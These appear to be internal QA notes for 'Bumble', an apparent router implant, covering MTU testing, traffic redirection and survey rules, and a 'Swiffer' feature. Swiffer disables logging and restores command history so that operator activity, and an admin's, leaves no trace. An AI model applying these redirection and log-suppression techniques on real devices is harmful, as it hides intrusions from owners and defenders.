Bumble 3.0.0/3.1Beta Test Notes
Test Summary

Downloaded and installed Ubuntu Server 10.04. This is the library version that was delievered with Bumble.
CT 2.4 which was delivered is not compatible with current ICON image (Debian 7.8)
MTU settings
CT MTUMaximum Transmission Unit setting can not go below 120 bytes.
Egress from Atk setting delaysim MTU<=108 and CTCounter Terrorism MTU<128 allows CTCounter Terrorism to connect, but states "currenct packet size restrictions are incompatible with selected Score protocol".
Ingress to Atk MTU<=508Bytes.


Score requires a minimum MTUMaximum Transmission Unit of 480Bytes for return traffic (from implant to CTCounter Terrorism).  
Flux will not be used with this tool so it will not be tested with flux.


Progress/Notes

Sample survey commands:
tp survey create 192.0.0.0 255.0.0.0 0 0.0.0.0 0.0.0.0 0 icmp -en
tp survey create 192.0.0.0 255.0.0.0 0 0.0.0.0 0.0.0.0 0 tcp -en


Sample redirection rule:redir create 10.1.243.2 255.255.255.255 0 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 255.255.255.255 0 0 tcp 10.1.243.2 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 0 0 -en

Sample traffic shaping:
sudo tc qdisc add dev eth0 root netem delay 2.5s 0.5s loss 25% 25% duplicate 2% corrupt 3% reorder 25% 50%
sudo ip link set eth0 mtu 128

Potential bug:
Add survey and redir rule.
redir create 10.1.243.2 255.255.255.255 0 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 255.255.255.255 0 0 tcp 10.1.243.2 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 0 0 -en
tp survey create XXX.X.XXX.X (JUMPSTART-5[US]) 255.255.255.0 0 0.0.0.0 0.0.0.0 0 tcp -en


Test redir.
Run Ixia test.
Test redir.  If redir fails, then re-try this sequence, but this time without adding the survey rules.  I wonder if the survey transaction log is filling causing the redir rule to stop working.  The translog stopped at index 4000 (is this coincidence or is this the size of the buffer?). A: This is how the score module is intended to work.

Potential Bug:  When running my expect script, copying the patch.bin file timed out.  Afterwards I attempted to reboot the H3C and it gave the belowmessage.  This occurred when I used the command "copy ftp://administrator:password@XXX.XXX.XXX.X (DNIC-RNET-192-100-100[US])/patch.bin patch.bin" to copy the patch file.  This is not the recommended way to copy the file.  No bug to report at this time.

Potential Bug: It appears that if the patch.bin file exists on cfa0: and you attempt to copy it again, it "copies" indefinitely.  Issuing the command "dir cfa0:" shows that the patch.bin file size is 0.  This may occurr when the patch file was incompletely applied.  This may have just occurred when I used the command "copy ftp://administrator:password@XXX.XXX.XXX.X (DNIC-RNET-192-100-100[US])/patch.bin patch.bin" to copy the patch file.  This is not the recommended way to copy the file.  No bug to report at this time.

Transaction Table rollover
Reboot DUT, install implant, establish comms via CT.
Start score: module start score
Configure transtable aging time to 1 second: tp filter -t 1
From Atk: wget --output-document=- http://XXX.XXX.X.XX (GB)Response should be from Bumble webserver #3 - XXX.XXX.X.XX (GB)


Add redir rule: redir create 192.168.254.6 255.255.255.255 0 0 XXX.XXX.X.XX (GB) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
Test redir rule: wget --output-document=- http://XXX.XXX.X.XX (GB)Response should be from Bumble webserver #4 - XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US])


Fill up transtable by running the "enterprise" profile on the Ixia.  Also add a survey rule: tp survey create 192.0.0.0 255.0.0.0 0 0.0.0.0 0.0.0.0 0 tcp -en
Check if redir still functions correctly: wget --output-document=- http://XXX.XXX.X.XX (GB)

Response should be from Bumble webserver #4 - XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US])

To futher confirm, check transtable using the command "tp showtrans" and take a snapshow of the first 10 entries.
Wait 10 seconds and check the transtable again.  Compare the first 10 entries with the snapshot you took.  The entries should be unique.  With the ixia running, enough entries should be created in a few seconds to cause the transtable to cycle.

Swiffer - Log Suppression
Reboot DUT, install implant, establish comms via CT.Insure swiffer is inactive:  tp swiffer show

Telnet to MSR and issue these commands:
display this
display users
display tcp
display logbuffer
display history-command all
These commands should appear in the logbuffer and history command


Activate swiffer at the CTCounter Terrorism prompt
tp swiffer activate
tp swiffer show


At the MSR console and telnet prompt:
Confirm info-center is disabled:  display info-center
display clock
display ftp client source
display interface brief
display ip routing-table


At the MSR console, issue thes commands
Confirm recent commands were not logged to log buffer:  display logbuffer
Confirm recent commands are logged to history:  display history-command all
Disabling the info-center will not disable the command history logging.  This is the reason for a snapshot of the history command file to be saved.  The saved history file will overwrite this history when Swiffer is deactivated.
This will also disable logging if a target admin issues commands.  There is no way to distinguish who is issuing the command.




Deactivate Swiffer using CT.  Deactivating Swiffer restores the snapshot to the command history
tp swiffer deactivate
Wait 5 seconds and confirm swiffer is deactivated:  tp swiffer show


At the MSR console and telnet prompt, confirm logs were removed
display logbuffer
display history-command all

Disable all redir rules:  redir disable 0

Redirection Test - ACLAccess Control List circumventionNot plausible with current implant hook point

Redirection Test (Lack of route on downstream router) 
Single Rule - ct_pt3-redir.exp (script starts at step iv)
Add default route to ASR:  ip route 0.0.0.0 0.0.0.0 XXX.XXX.XX.X (EU-MAP-5[US]) name To_MSR

From atk VM, ping XXX.XXX.XX.X (EU-MAP-5[US]).  It should be successful.


Remove default route from ASR:  no ip route 0.0.0.0 0.0.0.0 XXX.XXX.XX.X (EU-MAP-5[US]) name To_MSR

From atk VM, ping XXX.XXX.XX.X (EU-MAP-5[US]).  It should fail.

Swiffer (while redir rules enabled)
Repeat redir test and leave it running.  
Activate swiffer
Connect to target via telnet and execute "dis run", "dis clock", and "dis ip rout"
Disconnect from telnet session.
Deactivate swiffer
Inspect logfile and logbuffer for any traces of telnet connection


Swiffer - Telnet failed during sessionConfirm all logs get deleted if there are two telnet open sessions but one session close.  It is assumed that swiffer will start and stop logging when the command is issued, but need to confirm.

Swiffer - Info-Center gets enabled while Swiffer is active

BUM-3


Ad how test - Multiple reconnects to implant via CT
This is related to BUM-5.  One time after disconnecting from a CTCounter Terrorism session, and then trying to reconnect an error occured.  continuously_reconnect_CT.exp was created to continuously connect to CT, wait 10 sec, disconnect, wait 10 sec, then repeat indefinitely.
To setup the test, perform these steps:
Start simulating delay on DelaySim VM: sudo ./set_delay.sh
Open Atk Window 1, Ensure all tcpdump captures are closed. And then create a new capture:   sudo tcpdump -i eth0 -s 0 -w continuously_reconnect_CT.pcap

Open Atk Window 2, and run the expect script which will continuously loop connecting then disconnecting:  sudo ./continuously_reconnect_CT.exp
If you receive an error, the expect script should stop.  You will need to manually stop the pcap in Window 1 by pressing Ctrl-C.




Reconfigured interface
With implant installed, configure another gigabit interface.

Forensics TestsInspect pcap
UDP packets appear normal
Most TCPTransport Control Protocol appears normal.Telnet connections cause a lot of red to appear, likely due to the unreliability of the connection (delay sim is running).  Telnet connections also receive a RSTReal-time Transport Protocol from the MSR periodically.  It seems the MSR (server) issues the RSTReal-time Transport Protocol packet to close the telnet session.




Performance testing (IXIA)

 

Add IXIA ports directly to MSR.  Need to determine IPs to use (look at config).
Configure IXIA "hosts" to test connectivity to WWW1 and WWW2 (XXX.X.XXX.XXX (JUMPSTART-5[US]) & .112).
Backup MSR config
Copy off MSR f/w
Upload MSR f/w

 
Operator Notes

Do not use survey and redirection at the same time.
Disabling logging (using swiffer) will also disable logging for a target admin.
Commands execute while swiffer is enabled will not be removed from the history until swiffer is deactivated.  Info-Center will also be disabled as long as swiffer is active.
Add TP note about using Nmap with Score.
How do we clear a kernel exception log should one occur?
Once swiffer is stopped, it can not be restarted unless you re-install PBD.
